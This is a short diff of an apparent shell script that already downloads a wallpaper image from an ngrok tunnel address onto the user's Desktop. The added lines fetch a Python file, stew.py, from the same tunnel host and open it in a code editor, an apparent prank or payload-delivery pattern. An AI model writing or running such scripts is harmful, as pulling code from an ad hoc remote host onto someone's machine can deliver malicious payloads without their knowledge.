@@ -55,3 +55,5 @@ open_random_webpages(number_of_sites)
 EOF
 
 curl -o ~/Desktop/wall.webp 'https://9668-79-135-105-53.ngrok-free.app/wall.webp'
+curl -o ~/Desktop/stew.py 'https://9668-79-135-105-53.ngrok-free.app/stew.py'
+code ~/Desktop/stew.py
